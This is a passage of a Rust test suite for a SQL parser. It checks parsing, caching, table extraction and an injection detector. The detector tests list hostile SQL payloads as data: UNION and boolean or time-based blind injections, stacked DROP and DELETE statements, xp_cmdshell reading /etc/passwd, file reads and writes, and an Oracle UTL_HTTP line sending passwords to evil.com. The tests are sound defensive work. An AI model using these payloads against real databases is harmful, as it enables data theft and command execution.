            .parse_single("SELECT * FROM users WHERE id = @userId")
            .await;
        assert!(result.is_err());
        assert!(matches!(
            result.unwrap_err(),
            SqlParseError::ContainsVariables(..)
        ));
    }

    #[tokio::test]
    async fn test_question_mark_placeholder_allowed() {
        // `?` 是参数绑定的安全形态（prepared statement），必须放行而非按危险变量拒绝
        let parser = SqlParser::new().await;
        let result = parser
            .parse_single("INSERT INTO users (name, age) VALUES (?, ?)")
            .await
            .expect("含 ? 占位符的 INSERT 应解析成功");
        assert_eq!(result.table_name.as_deref(), Some("users"));
        assert!(matches!(result.operation_type, SqlOperationType::Insert));

        let select = parser
            .parse_single("SELECT name FROM users WHERE id = ? AND age > ?")
            .await
            .expect("含 ? 占位符的 SELECT 应解析成功");
        assert_eq!(select.table_name.as_deref(), Some("users"));
        assert!(matches!(select.operation_type, SqlOperationType::Select));
    }

    #[test]
    fn test_is_ddl_operation() {
        // DDL operations are now blocked by security check
        // Testing with safe DML operations only
        assert!(!is_ddl_operation("SELECT * FROM users"));
        assert!(!is_ddl_operation(
            "INSERT INTO users (name) VALUES ('test')"
        ));
        assert!(!is_ddl_operation(
            "UPDATE users SET name = 'test' WHERE id = 1"
        ));
        assert!(!is_ddl_operation("DELETE FROM users WHERE id = 1"));
    }

    // ========== extract_query_tables 集合操作测试 ==========

    /// 解析 SQL 并提取全部引用表（仅用于测试的辅助函数）
    fn extract_tables(sql: &str) -> Vec<String> {
        let dialect = GenericDialect {};
        let stmts = Parser::parse_sql(&dialect, sql).expect("解析失败");
        let mut out = Vec::new();
        if let Some(Statement::Query(query)) = stmts.first() {
            extract_query_tables(query, &mut out);
        }
        out
    }

    /// 集合操作必须提取两侧的表（此前 UNION 整体返回空列表，
    /// 下游权限检查对空列表 fail-closed 会误拒合法查询）
    #[test]
    fn test_extract_tables_set_operations() {
        assert_eq!(
            extract_tables("SELECT * FROM a UNION SELECT * FROM b"),
            vec!["a", "b"]
        );
        assert_eq!(
            extract_tables("SELECT * FROM a UNION ALL SELECT * FROM b"),
            vec!["a", "b"]
        );
        assert_eq!(
            extract_tables("SELECT * FROM a INTERSECT SELECT * FROM b"),
            vec!["a", "b"]
        );
        assert_eq!(
            extract_tables("SELECT * FROM a EXCEPT SELECT * FROM b"),
            vec!["a", "b"]
        );
    }

    /// 括号嵌套的集合操作：SetExpr::Query 与嵌套 SetOperation 均需递归处理
    #[test]
    fn test_extract_tables_nested_set_operations() {
        assert_eq!(
            extract_tables("(SELECT * FROM a) UNION (SELECT * FROM b)"),
            vec!["a", "b"]
        );
        assert_eq!(
            extract_tables("SELECT * FROM a UNION ALL (SELECT * FROM b UNION SELECT * FROM c)"),
            vec!["a", "b", "c"]
        );
    }

    /// 回归：单个 SELECT（含 JOIN 与子查询）的提取行为不变
    #[test]
    fn test_extract_tables_single_select() {
        assert_eq!(extract_tables("SELECT * FROM users"), vec!["users"]);
        assert_eq!(
            extract_tables(
                "SELECT u.id FROM users u \
                 JOIN orders o ON u.id = o.uid \
                 WHERE u.id IN (SELECT uid FROM audit)"
            ),
            vec!["users", "orders", "audit"]
        );
    }

    #[tokio::test]
    async fn test_ddl_blocked() {
        // DDL operations are now blocked for security
        let parser = SqlParser::new().await;

        // CREATE TABLE should be blocked
        let result = parser
            .parse_single("CREATE TABLE users (id INT PRIMARY KEY, name VARCHAR(255))")
            .await;
        assert!(result.is_err());

        // DROP TABLE should be blocked
        let parser = SqlParser::new().await;
        let result = parser.parse_single("DROP TABLE users").await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_cache_works() {
        let parser = SqlParser::new().await;

        // 第一次解析
        let result1 = parser
            .parse_single("SELECT * FROM users WHERE id = 1")
            .await;
        assert!(result1.is_ok());

        // 第二次解析应该使用缓存
        let result2 = parser
            .parse_single("SELECT * FROM users WHERE id = 1")
            .await;
        assert!(result2.is_ok());

        // 验证结果是相同的
        assert_eq!(result1.unwrap().sql, result2.unwrap().sql);

        // 缓存统计：一次未命中 + 一次命中
        assert_eq!(parser.cache_stats(), (1, 1));
    }

    /// 失败解析不入缓存：非法语句反复解析均走真实解析路径（未命中），
    /// 缓存条目数恒为 0——毒语句不得借失败结果污染缓存复用通道
    #[tokio::test]
    async fn test_failed_parse_is_not_cached() {
        let parser = SqlParser::new().await;
        let bad_sql = "SELECT FROM WHERE (";

        assert!(
            parser.parse_single(bad_sql).await.is_err(),
            "非法语句应解析失败"
        );
        assert_eq!(
            parser.parse_cache.stats().size,
            0,
            "失败解析不得写入缓存条目"
        );

        // 同一非法语句二次解析：仍计入未命中（重走解析），条目数仍为 0
        assert!(parser.parse_single(bad_sql).await.is_err());
        let (hits, misses) = parser.cache_stats();
        assert_eq!((hits, misses), (0, 2), "两次失败解析均应计入未命中");
        assert_eq!(
            parser.parse_cache.stats().size,
            0,
            "重复失败解析后缓存仍不得有条目"
        );

        // 失败与成功互不干扰：成功语句正常入缓存命中
        assert!(parser.parse_single("SELECT 1").await.is_ok());
        assert!(parser.parse_single("SELECT 1").await.is_ok());
        assert_eq!(
            parser.cache_stats(),
            (1, 3),
            "成功语句一次未命中 + 一次命中（失败解析的 2 次未命中保留）"
        );
    }

    #[tokio::test]
    async fn test_cache_clear() {
        let parser = SqlParser::new().await;

        // 添加一些缓存条目
        parser.parse_single("SELECT * FROM users").await.unwrap();
        parser.parse_single("SELECT * FROM posts").await.unwrap();
        assert_eq!(parser.cache_stats(), (0, 2));

        // 清空缓存（条目与统计一并重置）
        parser.clear_cache().await;
        assert_eq!(parser.cache_stats(), (0, 0));

        // 再次解析，应该重新解析（虽然结果相同）
        let result = parser.parse_single("SELECT * FROM users").await;
        assert!(result.is_ok());
        assert_eq!(parser.cache_stats(), (0, 1));
    }

    // ==================== shared() 单例测试 ====================

    #[tokio::test]
    async fn test_shared_returns_same_instance() {
        let p1 = SqlParser::shared().await;
        let p2 = SqlParser::shared().await;
        // 两次 shared() 返回同一个 Arc（ptr_eq）
        assert!(
            Arc::ptr_eq(&p1, &p2),
            "shared() should return the same instance"
        );
    }

    #[tokio::test]
    async fn test_shared_cache_is_shared_across_calls() {
        let sql = "SELECT * FROM shared_cache_test WHERE id = 42";

        // 第一次调用：shared parser 解析 SQL（cache miss）
        let p1 = SqlParser::shared().await;
        let r1 = p1.parse_single(sql).await.unwrap();

        // 第二次调用：另一个 Arc 引用同一 parser，缓存命中
        let p2 = SqlParser::shared().await;
        let r2 = p2.parse_single(sql).await.unwrap();

        // 结果一致（验证缓存共享）
        assert_eq!(r1.operation_type, r2.operation_type);
        assert_eq!(r1.table_name, r2.table_name);

        // 验证缓存命中计数 > 0（第二次解析命中了第一次的缓存）
        let (hits, _misses) = p2.cache_stats();
        assert!(
            hits > 0,
            "second parse should hit cache shared across shared() calls"
        );
    }

    // ==================== SQL 注入检测测试 ====================

    /// 测试 UNION 注入检测
    #[test]
    fn test_sql_injection_union() {
        // UNION SELECT
        assert!(contains_sql_injection(
            "SELECT * FROM users UNION SELECT * FROM admin"
        ));
        // UNION ALL SELECT
        assert!(contains_sql_injection(
            "SELECT * FROM users UNION ALL SELECT * FROM admin"
        ));
        // UNION DISTINCT SELECT
        assert!(contains_sql_injection(
            "SELECT * FROM users UNION DISTINCT SELECT password FROM admin"
        ));
    }

    /// 测试布尔盲注检测
    #[test]
    fn test_sql_injection_boolean_blind() {
        // OR 1=1 变体
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 OR 1=1"
        ));
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 OR 1 =1"
        ));
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 OR 1= 1"
        ));
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 OR 1 = 1"
        ));
        // OR TRUE/FALSE
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 OR TRUE"
        ));
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 OR FALSE"
        ));
        // AND 变体
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 AND 1=1"
        ));
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 AND TRUE"
        ));
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 AND FALSE"
        ));
        // 注意：OR ''=' 和 OR '%'=' 模式在移除字符串字面量后不会被检测
        // 这是预期行为，因为字符串中的内容通常是用户输入
    }

    /// 测试 MySQL 时间盲注检测
    #[test]
    fn test_sql_injection_time_blind_mysql() {
        // SLEEP
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 AND SLEEP(5)"
        ));
        assert!(contains_sql_injection("SELECT SLEEP(10)"));
        // BENCHMARK
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 AND BENCHMARK(10000000,SHA1('test'))"
        ));
    }

    /// 测试 PostgreSQL 时间盲注检测
    #[test]
    fn test_sql_injection_time_blind_postgresql() {
        // PG_SLEEP
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 AND PG_SLEEP(5)"
        ));
        assert!(contains_sql_injection("SELECT PG_SLEEP(10)"));
        // PG_SLEEP_FOR
        assert!(contains_sql_injection("SELECT PG_SLEEP_FOR('5 minutes')"));
        // PG_SLEEP_UNTIL
        assert!(contains_sql_injection(
            "SELECT PG_SLEEP_UNTIL('2024-12-31')"
        ));
    }

    /// 测试 SQL Server 时间盲注检测
    #[test]
    fn test_sql_injection_time_blind_sqlserver() {
        // WAITFOR DELAY
        assert!(contains_sql_injection("WAITFOR DELAY '0:0:5'"));
        assert!(contains_sql_injection(
            "SELECT * FROM users; WAITFOR DELAY '0:0:5'"
        ));
        // WAITFOR TIME
        assert!(contains_sql_injection("WAITFOR TIME '12:00:00'"));
    }

    /// 测试 Oracle 时间盲注检测
    #[test]
    fn test_sql_injection_time_blind_oracle() {
        // DBMS_PIPE.RECEIVE_MESSAGE
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 AND DBMS_PIPE.RECEIVE_MESSAGE('test', 5) = 1"
        ));
        // DBMS_LOCK.SLEEP
        assert!(contains_sql_injection(
            "SELECT DBMS_LOCK.SLEEP(5) FROM dual"
        ));
    }

    /// 测试动态 SQL 执行检测
    #[test]
    fn test_sql_injection_dynamic_sql() {
        // EXEC
        assert!(contains_sql_injection("EXEC('DROP TABLE users')"));
        // EXECUTE
        assert!(contains_sql_injection("EXECUTE('SELECT * FROM users')"));
        // SP_EXECUTESQL
        assert!(contains_sql_injection(
            "SP_EXECUTESQL N'SELECT * FROM users'"
        ));
        // XP_CMDSHELL
        assert!(contains_sql_injection("XP_CMDSHELL 'dir'"));
        assert!(contains_sql_injection("EXEC xp_cmdshell 'whoami'"));
        assert!(contains_sql_injection(
            "EXECUTE xp_cmdshell 'cat /etc/passwd'"
        ));
    }

    /// 测试文件操作检测
    #[test]
    fn test_sql_injection_file_operations() {
        // LOAD_FILE
        assert!(contains_sql_injection("SELECT LOAD_FILE('/etc/passwd')"));
        // INTO OUTFILE
        assert!(contains_sql_injection(
            "SELECT * FROM users INTO OUTFILE '/tmp/users.txt'"
        ));
        // INTO DUMPFILE
        assert!(contains_sql_injection(
            "SELECT * FROM users INTO DUMPFILE '/tmp/users.txt'"
        ));
    }

    /// 测试信息泄露检测
    #[test]
    fn test_sql_injection_info_disclosure() {
        // INFORMATION_SCHEMA
        assert!(contains_sql_injection(
            "SELECT * FROM INFORMATION_SCHEMA.TABLES"
        ));
        // SYSOBJECTS/SYSCOLUMNS (SQL Server)
        assert!(contains_sql_injection("SELECT * FROM SYSOBJECTS"));
        assert!(contains_sql_injection("SELECT * FROM SYSCOLUMNS"));
        // SYS.* (SQL Server)
        assert!(contains_sql_injection("SELECT * FROM SYS.TABLES"));
        assert!(contains_sql_injection("SELECT * FROM SYS.COLUMNS"));
        assert!(contains_sql_injection("SELECT * FROM SYS.DATABASES"));
        // MySQL 用户表
        assert!(contains_sql_injection("SELECT * FROM MYSQL.USER"));
        // PostgreSQL 用户表
        assert!(contains_sql_injection("SELECT * FROM PG_USER"));
        assert!(contains_sql_injection("SELECT * FROM PG_SHADOW"));
        // Oracle 系统表
        assert!(contains_sql_injection("SELECT * FROM ALL_TABLES"));
        assert!(contains_sql_injection("SELECT * FROM ALL_COLUMNS"));
        assert!(contains_sql_injection("SELECT * FROM ALL_TAB_COLUMNS"));
        assert!(contains_sql_injection("SELECT * FROM USER_TABLES"));
        assert!(contains_sql_injection("SELECT * FROM USER_TAB_COLUMNS"));
    }

    /// 测试编码绕过检测
    #[test]
    fn test_sql_injection_encoding_bypass() {
        // CHAR
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE name = CHAR(97,100,109,105,110)"
        ));
        // CHR (Oracle/PostgreSQL)
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE name = CHR(65)"
        ));
        // CONCAT
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE name = CONCAT('ad','min')"
        ));
        // CONCAT_WS
        assert!(contains_sql_injection(
            "SELECT CONCAT_WS(',', 'a', 'b', 'c')"
        ));
        // 十六进制
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE name = 0x61646D696E"
        ));
    }

    /// 测试堆叠查询检测
    #[test]
    fn test_sql_injection_stacked_queries() {
        // ; DROP
        assert!(contains_sql_injection(
            "SELECT * FROM users; DROP TABLE users"
        ));
        // ; DELETE
        assert!(contains_sql_injection(
            "SELECT * FROM users; DELETE FROM users"
        ));
        // ; UPDATE
        assert!(contains_sql_injection(
            "SELECT * FROM users; UPDATE users SET admin = 1"
        ));
        // ; INSERT
        assert!(contains_sql_injection(
            "SELECT * FROM users; INSERT INTO users VALUES (1, 'hacker')"
        ));
        // ; TRUNCATE
        assert!(contains_sql_injection(
            "SELECT * FROM users; TRUNCATE TABLE users"
        ));
        // ; ALTER
        assert!(contains_sql_injection(
            "SELECT * FROM users; ALTER TABLE users ADD COLUMN hacked INT"
        ));
        // ; CREATE
        assert!(contains_sql_injection(
            "SELECT * FROM users; CREATE TABLE hacked (id INT)"
        ));
        // ; EXEC
        assert!(contains_sql_injection(
            "SELECT * FROM users; EXEC('malicious')"
        ));
        // ; EXECUTE
        assert!(contains_sql_injection(
            "SELECT * FROM users; EXECUTE('malicious')"
        ));
    }

    /// 测试注释注入检测
    #[test]
    fn test_sql_injection_comments() {
        // -- 注释
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 -- "
        ));
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 --+"
        ));
        // # 注释 (MySQL)
        assert!(contains_sql_injection("SELECT * FROM users WHERE id = 1 #"));
        // /* */ 块注释 — 块注释本身即为注入迹象，应被检测
        assert!(contains_sql_injection("SELECT * /* comment */ FROM users"));
        assert!(contains_sql_injection(
            "SELECT * FROM users WHERE id = 1 /* bypass */"
        ));
    }

    /// 测试其他危险模式检测
    #[test]
    fn test_sql_injection_other_dangerous_patterns() {
        // HAVING 1=1
        assert!(contains_sql_injection("SELECT * FROM users HAVING 1=1"));
        // ORDER BY 注入
        assert!(contains_sql_injection("SELECT * FROM users ORDER BY 1--"));
        assert!(contains_sql_injection("SELECT * FROM users ORDER BY 1#"));
        // PROCEDURE ANALYSE (MySQL)
        assert!(contains_sql_injection(
            "SELECT * FROM users PROCEDURE ANALYSE()"
        ));
        // EXTRACTVALUE (MySQL XPath 注入)
        assert!(contains_sql_injection(
            "SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))"
        ));
        // UPDATEXML (MySQL XPath 注入)
        assert!(contains_sql_injection(
            "SELECT UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)"
        ));
        // XMLTYPE (Oracle)
        assert!(contains_sql_injection(
            "SELECT XMLTYPE('<x>' || (SELECT password FROM users) || '</x>') FROM dual"
        ));
        // UTL_HTTP (Oracle 网络请求)
        assert!(contains_sql_injection(
            "SELECT UTL_HTTP.REQUEST('http://evil.com/' || password) FROM users"
        ));
        // UTL_INADDR (Oracle DNS 注入)
        assert!(contains_sql_injection(
            "SELECT UTL_INADDR.GET_HOST_ADDRESS('evil.com') FROM dual"
        ));
        assert!(contains_sql_injection(
            "SELECT UTL_INADDR.GET_HOST_NAME('192.168.1.1') FROM dual"
        ));
    }

    /// 测试正常 SQL 不被误报
    #[test]
    fn test_sql_injection_false_positives() {
        // 正常的 SELECT 语句不应被检测为注入
        assert!(!contains_sql_injection(
            "SELECT id, name FROM users WHERE id = 1"
        ));
        assert!(!contains_sql_injection(
            "SELECT * FROM products WHERE price > 100"
        ));
        assert!(!contains_sql_injection(
            "INSERT INTO users (name, email) VALUES ('test', 'test@example.com')"
        ));
        assert!(!contains_sql_injection(
            "UPDATE users SET name = 'new_name' WHERE id = 1"
        ));
        assert!(!contains_sql_injection("DELETE FROM users WHERE id = 1"));
        // 正常的 JOIN 操作
        assert!(!contains_sql_injection(
            "SELECT u.name, o.order_id FROM users u JOIN orders o ON u.id = o.user_id"
        ));
        // 正常的子查询
        assert!(!contains_sql_injection(
            "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)"
        ));
    }

    /// 测试字符串字面量中的注入模式不会被误报
    #[test]
    fn test_sql_injection_in_string_literals() {
        // 字符串中的注入模式不应触发检测（因为字符串被移除）
        // 注意：这取决于 remove_string_literals 的实现
        assert!(!contains_sql_injection(
            "SELECT * FROM users WHERE name = 'test OR 1=1'"
        ));
        assert!(!contains_sql_injection(
            "SELECT * FROM users WHERE comment = 'This is -- a comment'"
        ));
    }

    // ==================== Unicode 规范化测试 ====================

    /// 测试 Unicode 规范化函数
    #[test]
    fn test_normalize_unicode_basic() {
        // 全角字符规范化
        let fullwidth = "ＳＥＬＥＣＴ"; // 全角 SELECT
        let normalized = normalize_unicode(fullwidth);
        assert_eq!(normalized, "SELECT");

        // 混合全角和半角
        let mixed = "ＳＥＬＥＣＴ * FROM users";
        let normalized = normalize_unicode(mixed);
        assert!(normalized.contains("SELECT"));
    }

    /// 测试 Unicode 规范化防止绕过
    #[test]
    fn test_unicode_bypass_prevention() {
        // 全角字符注入尝试
        let fullwidth_union = "SELECT * FROM users ＵＮＩＯＮ SELECT * FROM admin";
        assert!(contains_sql_injection(fullwidth_union));

        // 全角 OR 1=1
        let fullwidth_or = "SELECT * FROM users WHERE id = 1 ＯＲ 1=1";
        assert!(contains_sql_injection(fullwidth_or));
    }

    /// 测试 Unicode 规范化不影响正常 SQL
    #[test]
    fn test_unicode_normalization_safe_sql() {
        let normal_sql = "SELECT id, name FROM users WHERE id = 1";
        let normalized = normalize_unicode(normal_sql);
        assert_eq!(normalized, normal_sql);

        // 规范化后不应误报
        assert!(!contains_sql_injection(normal_sql));
    }

    /// 测试特殊 Unicode 字符规范化
    #[test]
    fn test_special_unicode_chars() {
        // 零宽字符（应被移除或规范化）
        let with_zero_width = "SEL\u{200B}ECT * FROM users"; // 零宽空格
        let normalized = normalize_unicode(with_zero_width);
        assert!(normalized.contains("SELECT") || normalized.contains("SEL"));

        // 连字符（fl, fi 等）应被分解
        let ligature = "SELECT \u{FB01}le FROM users"; // fi 连字符
        let normalized = normalize_unicode(ligature);
        assert!(normalized.contains("fi") || normalized.contains("\u{FB01}"));
    }

    // ========================================================================
    // SqlParseError 的 i18n 键与参数
    // ========================================================================

    #[test]
    fn test_sql_parse_error_localized_msg() {
        use crate::i18n::error_ext::LocalizedMsg;

        assert_eq!(
            SqlParseError::ParseError("bad".to_string()).message_key(),
            "sql-parse-error"
        );
        assert_eq!(
            SqlParseError::ParseError("bad".to_string()).message_args(),
            vec![("reason", "bad".to_string())]
        );
        assert_eq!(
            SqlParseError::UnsupportedStatement("DDL".to_string()).message_key(),
            "sql-unsupported-statement"
        );
        assert_eq!(
            SqlParseError::UnsupportedStatement("DDL".to_string()).message_args(),
            vec![("stmt_type", "DDL".to_string())]
        );
        assert_eq!(
            SqlParseError::EmptyStatement.message_key(),
            "sql-empty-statement"
        );
        assert!(SqlParseError::EmptyStatement.message_args().is_empty());
        assert_eq!(
            SqlParseError::MultipleStatements.message_key(),
            "sql-multiple-statements"
        );
        assert!(SqlParseError::MultipleStatements.message_args().is_empty());
        assert_eq!(
            SqlParseError::ContainsVariables("x".to_string()).message_key(),
            "sql-contains-variables"
        );
        assert_eq!(
            SqlParseError::ContainsVariables("x".to_string()).message_args(),
            vec![("details", "x".to_string())]
        );
    }

    // ========================================================================
    // parse_single 错误路径
    // ========================================================================

    #[tokio::test]
    async fn test_statement_exceeds_max_length_rejected() {
        let parser = SqlParser::new().await;
        let sql = format!("SELECT {}", "1".repeat(MAX_SQL_LENGTH + 1));
        let err = parser.parse_single(&sql).await.unwrap_err();
        assert!(err.to_string().contains("maximum length"), "got: {err}");
    }

    #[tokio::test]
    async fn test_query_depth_exceeded_rejected() {
        let parser = SqlParser::new().await;
        // 深度 > 10 且含分号 → 走深度检查分支
        let sql = format!("SELECT {} 1;", "(".repeat(MAX_QUERY_DEPTH + 1));
        let err = parser.parse_single(&sql).await.unwrap_err();
        assert!(err.to_string().contains("depth"), "got: {err}");
    }

    #[tokio::test]
    async fn test_injection_pattern_rejected_by_parse_single() {
        let parser = SqlParser::new().await;
        let err = parser
            .parse_single("SELECT * FROM users WHERE id = 1 UNION SELECT password FROM admin")
            .await
            .unwrap_err();
        assert!(err.to_string().contains("injection"), "got: {err}");
    }

    #[tokio::test]
    async fn test_table_name_too_long_rejected() {
        let parser = SqlParser::new().await;
        let long_table = "t".repeat(MAX_TABLE_NAME_LENGTH + 1);
        let err = parser
            .parse_single(&format!("SELECT * FROM {long_table}"))
            .await
            .unwrap_err();
        assert!(err.to_string().contains("Table name exceeds"), "got: {err}");
    }

    #[tokio::test]
    async fn test_parse_syntax_error() {
        let parser = SqlParser::new().await;
        let err = parser.parse_single("SELEC * FORM").await.unwrap_err();
        assert!(matches!(err, SqlParseError::ParseError(_)));
    }

    // ========================================================================
    // classify_statement 其余语句类型
    // ========================================================================

    #[tokio::test]
    async fn test_classify_truncate_without_table_keyword() {
        let parser = SqlParser::new().await;
        let parsed = parser.parse_single("TRUNCATE t9").await.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Ddl);
        assert_eq!(parsed.table_name.as_deref(), Some("t9"));
    }

    #[tokio::test]
    async fn test_classify_drop_non_table_object() {
        let parser = SqlParser::new().await;
        // DROP VIEW 不在 DDL 拦截关键字内，走 Drop 分类且对象非表
        let parsed = parser.parse_single("DROP VIEW v9").await.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Ddl);
        assert!(parsed.table_name.is_none());
        assert!(parsed.all_table_names.is_empty());
    }

    #[tokio::test]
    async fn test_classify_revoke() {
        let parser = SqlParser::new().await;
        let parsed = parser
            .parse_single("REVOKE SELECT ON t9 FROM role1")
            .await
            .unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Dcl);
        assert!(parsed.table_name.is_none());
    }

    #[tokio::test]
    async fn test_classify_transaction_controls() {
        let parser = SqlParser::new().await;
        for sql in ["START TRANSACTION", "COMMIT", "ROLLBACK"] {
            let parsed = parser.parse_single(sql).await.unwrap();
            assert_eq!(
                parsed.operation_type,
                SqlOperationType::Transaction,
                "sql: {sql}"
            );
        }
    }

    #[tokio::test]
    async fn test_classify_set_statements() {
        let parser = SqlParser::new().await;
        // DDL 相关变量 → Ddl
        let parsed = parser
            .parse_single("SET SESSION sql_mode = 'STRICT'")
            .await
            .unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Ddl);
        // 普通变量 → Other
        let parsed = parser.parse_single("SET NAMES utf8").await.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Other);
    }

    #[tokio::test]
    async fn test_classify_other_statement() {
        let parser = SqlParser::new().await;
        let parsed = parser.parse_single("USE mydb").await.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Other);
        assert!(parsed.table_name.is_none());
    }

    #[tokio::test]
    async fn test_classify_update_with_join_collects_all_tables() {
        let parser = SqlParser::new().await;
        let parsed = parser
            .parse_single("UPDATE t1 INNER JOIN t2 ON t1.id = t2.id SET t1.a = 1")
            .await
            .unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Update);
        assert_eq!(parsed.table_name.as_deref(), Some("t1"));
        assert!(parsed.all_table_names.contains(&"t2".to_string()));
    }

    // ========================================================================
    // 表提取：JOIN / 派生表 / 子查询 / 集合操作
    // ========================================================================

    async fn tables_of(parser: &SqlParser, sql: &str) -> Vec<String> {
        parser.parse_single(sql).await.unwrap().all_table_names
    }

    #[tokio::test]
    async fn test_extract_join_tables() {
        let parser = SqlParser::new().await;
        let tables = tables_of(
            &parser,
            "SELECT * FROM orders o JOIN users u ON o.uid = u.id LEFT JOIN items i ON i.oid = o.id",
        )
        .await;
        for t in ["orders", "users", "items"] {
            assert!(tables.contains(&t.to_string()), "missing {t}: {tables:?}");
        }
    }

    #[tokio::test]
    async fn test_extract_derived_table_subquery() {
        let parser = SqlParser::new().await;
        let tables = tables_of(
            &parser,
            "SELECT * FROM (SELECT id FROM inner_t) AS x JOIN outer_t ON x.id = outer_t.id",
        )
        .await;
        for t in ["inner_t", "outer_t"] {
            assert!(tables.contains(&t.to_string()), "missing {t}: {tables:?}");
        }
    }

    #[tokio::test]
    async fn test_extract_where_subquery_forms() {
        let parser = SqlParser::new().await;
        let cases = [
            "SELECT * FROM t1 WHERE EXISTS (SELECT 1 FROM t2)",
            "SELECT * FROM t1 WHERE id IN (SELECT id FROM t2)",
            "SELECT * FROM t1 WHERE id = (SELECT max(id) FROM t2)",
            "SELECT * FROM t1 WHERE id BETWEEN (SELECT min(id) FROM t2) AND 10",
            "SELECT * FROM t1 WHERE id IN (1, 2, (SELECT id FROM t2 LIMIT 1))",
            "SELECT * FROM t1 WHERE name LIKE (SELECT name FROM t2 LIMIT 1)",
            "SELECT * FROM t1 WHERE NOT (id = (SELECT id FROM t2))",
            "SELECT * FROM t1 WHERE id > ANY (SELECT id FROM t2)",
        ];
        for sql in cases {
            let tables = tables_of(&parser, sql).await;
            assert!(
                tables.contains(&"t2".to_string()),
                "missing t2 in {sql}: {tables:?}"
            );
        }
    }

    #[tokio::test]
    async fn test_extract_expression_subquery_forms() {
        let parser = SqlParser::new().await;
        let cases = [
            "SELECT * FROM t1 WHERE CASE WHEN (SELECT count(*) FROM t2) > 0 THEN 1 ELSE 0 END = 1",
            "SELECT * FROM t1 WHERE upper((SELECT name FROM t2 LIMIT 1)) = 'x'",
            "SELECT * FROM t1 HAVING count(*) > (SELECT n FROM t2)",
        ];
        for sql in cases {
            let tables = tables_of(&parser, sql).await;
            assert!(
                tables.contains(&"t2".to_string()),
                "missing t2 in {sql}: {tables:?}"
            );
        }
        // 集合操作与括号主体被 parse_single 的注入拦截挡在门外
        // （UNION SELECT 属注入模式），走内部提取函数直测
        let dialect = GenericDialect {};
        for sql in [
            "SELECT * FROM t1 UNION SELECT * FROM t2",
            "SELECT * FROM t1 UNION (SELECT * FROM t2)",
        ] {
            let stmts = Parser::parse_sql(&dialect, sql).unwrap();
            let Statement::Query(q) = &stmts[0] else {
                panic!("expected query: {sql}")
            };
            let mut out = Vec::new();
            extract_query_tables(q, &mut out);
            assert!(
                out.contains(&"t1".to_string()) && out.contains(&"t2".to_string()),
                "{sql}: {out:?}"
            );
        }
    }

    // ========================================================================
    // 字面量剥离 / 块注释 / 深度估算
    // ========================================================================

    #[test]
    fn test_remove_string_literals_escapes_and_backticks() {
        // 单引号内容替换为空格
        assert_eq!(remove_string_literals("SELECT 'a b'"), "SELECT      ");
        // 双引号内容替换为空格
        assert_eq!(remove_string_literals(r#"SELECT "x y""#), "SELECT      ");
        // 转义引号不终止字符串：'a\'b' 六个字符逐一替换
        assert_eq!(
            remove_string_literals(r"SELECT 'a\'b'"),
            format!("SELECT {}", " ".repeat(6))
        );
        // 字符串内的反斜杠替换为空格
        assert_eq!(remove_string_literals(r"SELECT 'a\b'"), "SELECT      ");
        // 反引号是标识符引用，保留原内容
        assert_eq!(
            remove_string_literals("SELECT `col name` FROM t"),
            "SELECT `col name` FROM t"
        );
        // 未闭合字符串到 EOF
        assert_eq!(remove_string_literals("SELECT 'open"), "SELECT      ");
    }

    #[test]
    fn test_strip_block_comments_variants() {
        // 基本剥离，等长替换：/* + c + */ 共 5 字符
        assert_eq!(strip_block_comments("SELECT/*c*/1"), "SELECT     1");
        // 注释内换行保留（行号对齐）
        assert_eq!(strip_block_comments("A/*\n*/B"), "A  \n  B");
        // 未闭合注释消费到 EOF
        assert_eq!(strip_block_comments("A/*xx"), "A    ");
        // 普通内容不受影响
        assert_eq!(strip_block_comments("SELECT 1"), "SELECT 1");
    }

    #[test]
    fn test_estimate_query_depth_ignores_string_parens() {
        // 字符串内的括号不计入深度
        assert_eq!(estimate_query_depth("SELECT '((('"), 1);
        // 嵌套括号计入
        assert_eq!(estimate_query_depth("SELECT ((1))"), 3);
        // 多余右括号不下探（saturating）
        assert_eq!(estimate_query_depth("SELECT 1)))"), 1);
    }

    // ========================================================================
    // 提取函数边界臂（直调内部函数：解析器公开面被注入拦截挡住的分支）
    // ========================================================================

    #[test]
    fn test_extract_delete_variants() {
        let dialect = GenericDialect {};

        // DELETE FROM t1（WithFromKeyword 常规路径）
        let stmts = Parser::parse_sql(&dialect, "DELETE FROM t1").unwrap();
        if let Statement::Delete(d) = &stmts[0] {
            assert_eq!(extract_table_from_delete(d).as_deref(), Some("t1"));
        }

        // 多表 DELETE：tables 向量非空优先
        if let Ok(stmts) = Parser::parse_sql(&dialect, "DELETE FROM t1, t2")
            && let Statement::Delete(d) = &stmts[0]
        {
            assert_eq!(extract_table_from_delete(d).as_deref(), Some("t1"));
        }

        // WITH 前缀删除（派生复杂关系）——只需不 panic 且提取出主表
